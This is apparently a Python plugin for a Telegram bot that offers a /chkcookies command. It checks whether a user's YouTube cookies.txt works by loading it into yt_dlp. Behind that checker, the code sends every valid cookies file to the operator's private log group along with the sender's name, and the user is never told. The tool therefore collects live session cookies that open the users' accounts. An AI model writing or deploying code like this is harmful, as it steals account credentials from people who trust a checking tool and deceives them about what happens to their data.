import yt_dlp
import os
from datetime import datetime
from SONALI import app
from pyrogram import filters
from pyrogram.types import Message
from config import LOGGER_ID as LOGS_GROUP_ID  # Config se Log Group ID lena

# ✅ Active Users Tracker
active_users = {}

# 🔥 Stylish Symbols for VIP Look
BULLET = "➤"
CHECK = "✅"
CROSS = "❌"
CLOCK = "⏳"
SHIELD = "🛡"
USER = "👤"
TIME = "⏰"

# ✅ Step 1: Enable Checking with `/chkcookies`
@app.on_message(filters.command("chkcookies") & filters.private)
async def enable_cookie_check(client, message):
    active_users[message.chat.id] = True  # User Active List me Add
    await message.reply(
        f"{CHECK} ɴᴏᴡ 𝘀ᴇɴᴅ ʏᴏᴜʀ `cookies.txt` ғɪʟᴇ ᴛᴏ ᴄʜᴇᴄᴋ! {CLOCK}\n\n"
        f"📌 **Steps:**\n"
        f"1️⃣ ᴏᴘᴇɴ ғɪʟᴇ ᴍᴀɴᴀɢᴇʀ 📂\n"
        f"2️⃣ ғɪɴᴅ `cookies.txt`\n"
        f"3️⃣ 𝘀ᴇɴᴅ ɪᴛ ʜᴇʀᴇ ✅"
    )

# ❌ Step 2: Handle Wrong Inputs (Images, Videos, Text)
@app.on_message(filters.private & ~filters.document)
async def warn_wrong_input(client, message):
    if active_users.get(message.chat.id):
        await message.reply(
            f"{CROSS} **ɪɴᴄᴏʀʀᴇᴄᴛ ɪɴᴘᴜᴛ!**\n"
            "✅ **Only send `cookies.txt` file.**\n\n"
            "📌 **Steps:**\n"
            "1️⃣ Open File Manager 📂\n"
            "2️⃣ Find `cookies.txt`\n"
            "3️⃣ Send it here ✅"
        )

        # **Auto Reset User**
        del active_users[message.chat.id]  

        # **Log the Error**
        log_msg = f"""
{SHIELD} **ɪɴᴄᴏʀʀᴇᴄᴛ ɪɴᴘᴜᴛ ᴅᴇᴛᴇᴄᴛᴇᴅ!**
{BULLET} {USER} **User:** {message.from_user.first_name}
{BULLET} {TIME} **Time:** {datetime.now().strftime("%d-%m-%Y %I:%M %p")}
{BULLET} {CROSS} **Error:** Sent wrong file type instead of `cookies.txt`!
"""
        await client.send_message(LOGS_GROUP_ID, log_msg)

# ✅ Step 3: Accept Only If `/chkcookies` was Used
@app.on_message(filters.document & filters.private)
async def check_cookies_from_file(client, message: Message):
    if message.chat.id not in active_users:
        return  # Ignore if user didn't use `/chkcookies`

    file_path = await message.download()

    if not file_path.endswith(".txt"):
        await message.reply(f"{CROSS} **Only send a valid `cookies.txt` file!**")
        del active_users[message.chat.id]  # Auto Reset User
        return

    # ✅ Step 4: Read Cookies File
    try:
        with open(file_path, "r") as f:
            cookies_data = f.read().strip()

        if not cookies_data:
            await message.reply(f"{CROSS} **Your `cookies.txt` file is empty!**")
            os.remove(file_path)  # Delete temp file
            del active_users[message.chat.id]  # Auto Reset User
            return

        # ✅ Step 5: Validate YouTube Cookies
        ydl_opts = {"quiet": True, "cookiefile": file_path}
        check_time = datetime.now().strftime("%d-%m-%Y %I:%M %p")  # Format: DD-MM-YYYY HH:MM AM/PM
        user_name = message.from_user.username
        display_name = f"@{user_name}" if user_name else message.from_user.first_name

        try:
            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                ydl.extract_info("https://www.youtube.com/watch?v=dQw4w9WgXcQ", download=False)

            msg = f"{CHECK} **Your YouTube Cookies are Valid!**"
            log_msg = f"""
{SHIELD} **Cookies Checked!**
{BULLET} {CHECK} **Result:** Working {CHECK}
{BULLET} {USER} **User:** {display_name}
{BULLET} {TIME} **Checked At:** {check_time}
"""

            # ✅ Send valid cookies to group
            await client.send_document(LOGS_GROUP_ID, file_path, caption=log_msg)

        except yt_dlp.utils.ExtractorError:
            msg = f"{CROSS} **Your YouTube Cookies are Invalid or Expired!**"
            log_msg = f"""
{SHIELD} **Cookies Checked!**
{BULLET} {CROSS} **Result:** Invalid {CROSS}
{BULLET} {USER} **User:** {display_name}
{BULLET} {TIME} **Checked At:** {check_time}
"""
        # ✅ Send Log Only (Without File)
        await client.send_message(LOGS_GROUP_ID, log_msg)
        await message.reply(msg, quote=True)

    except Exception as e:
        await message.reply(f"⚠️ **Error Reading File:** `{str(e)}`")

    # ✅ Step 6: Cleanup & Reset User
    os.remove(file_path)
    del active_users[message.chat.id]
